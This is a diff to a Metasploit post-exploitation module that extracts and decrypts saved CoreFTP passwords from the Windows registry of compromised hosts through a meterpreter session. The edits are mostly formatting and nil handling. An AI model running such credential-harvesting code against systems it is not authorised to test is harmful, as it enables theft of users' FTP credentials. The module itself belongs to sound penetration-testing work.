@@ -20,19 +20,19 @@ class Metasploit3 < Msf::Post
 	include Msf::Post::Windows::UserProfiles
 
 	def initialize(info={})
-		super( update_info( info,
-				'Name'          => 'Windows Gather CoreFTP Saved Password Extraction',
-				'Description'   => %q{
-					This module extracts saved passwords from the CoreFTP FTP client. These 
-				passwords are stored in the registry. They are encrypted with AES-128-ECB. 
-				This module extracts and decrypts these passwords.
-				},
-				'License'       => MSF_LICENSE,
-				'Author'        => ['TheLightCosine <thelightcosine[at]gmail.com>'],
-				'Version'       => '$Revision$',
-				'Platform'      => [ 'windows' ],
-				'SessionTypes'  => [ 'meterpreter' ]
-			))
+		super(update_info(info,
+			'Name'          => 'Windows Gather CoreFTP Saved Password Extraction',
+			'Description'   => %q{
+				This module extracts saved passwords from the CoreFTP FTP client. These 
+			passwords are stored in the registry. They are encrypted with AES-128-ECB. 
+			This module extracts and decrypts these passwords.
+			},
+			'License'       => MSF_LICENSE,
+			'Author'        => ['TheLightCosine <thelightcosine[at]gmail.com>'],
+			'Version'       => '$Revision$',
+			'Platform'      => [ 'windows' ],
+			'SessionTypes'  => [ 'meterpreter' ]
+		))
 	end
 
 	def run
@@ -49,9 +49,9 @@ class Metasploit3 < Msf::Post
 
 				subkeys.each do |site|
 					site_key = "#{hive['HKU']}\\Software\\FTPware\\CoreFTP\\Sites\\#{site}"
-					host = registry_getvaldata(site_key, "Host")
-					user = registry_getvaldata(site_key, "User")
-					port = registry_getvaldata(site_key, "Port")
+					host = registry_getvaldata(site_key, "Host") || ""
+					user = registry_getvaldata(site_key, "User") || ""
+					port = registry_getvaldata(site_key, "Port") || ""
 					epass = registry_getvaldata(site_key, "PW")
 					next if epass == nil or epass == ""
 					pass = decrypt(epass)
@@ -66,7 +66,7 @@ class Metasploit3 < Msf::Post
 					report_auth_info(auth)
 				end
 			rescue
-				print_status("Cannot Access User SID: #{hive['HKU']}")
+				print_error("Cannot Access User SID: #{hive['HKU']}")
 			end 
 		end
 		unload_our_hives(userhives)
